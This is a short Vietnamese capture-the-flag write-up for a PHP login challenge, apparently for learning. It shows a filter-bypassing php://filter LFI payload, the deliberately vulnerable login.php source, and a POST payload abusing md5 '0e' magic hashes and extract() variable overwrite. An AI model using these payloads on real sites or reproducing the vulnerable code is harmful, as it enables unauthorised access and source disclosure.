Vào thì được Form Login.<br>
Để ý ở dưới có dòng `Flag here ?`, ấn vào thử thì thấy đâu đó bóng dáng thấy Huấn.<br>
Ok, fine.<br>
Tiếp tục nhìn lên url trông có vẻ giống bị LFI, và đúng thật, nhưng bị filter r.<br>
Nghiên cứu 1 lúc thì có Payload: `pHp://FilTer/convert.base64-encode/resource=index`(lấy source file login cũng vậy).<br>
`login.php`
```php
<?php 
		
  	include ("flag.php"); //real flag in $flag

	if ($_SERVER['REQUEST_METHOD'] == "POST") {
		if(!empty($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
			$password = random_int(10000000, 99999999);
			extract($_POST);
			$user_hash ='0e902564435691274142490923013038' ;
	
			if (md5($user) == $user_hash && $password === $pass){
				echo $flag;
				die();
			}else{
				die("Only admin have flag !!");
			}
		}
	}
?>
```
Để echo $flag thì cần bypass user và pass.<br>
User thì bypass dễ rỗi, chỉ cần sử dụng 1 chuỗi mà sau khi md5 thành 1 chuỗi mới có `0e` ở đầu là được.<br>
Pass thì có vẻ khó hơn, sau 1 hồi hỏi anh Google thì thấy có lỗi ở hàm exreact. Các bạn có thể tham khảo ở đây: https://davidnoren.com/post/php-extract-vulnerability/<br>

Rồi xây dựng payload thôi.<br>
Payload: user=DQWRASX&pass=1234&password=1234 (khi qua hàm extract thì giá trị password thành 1234)<br>
Vậy là được flag:
![image](https://user-images.githubusercontent.com/96786536/151706306-b73b4302-df7e-4894-99ea-56ad4d9743ed.png)
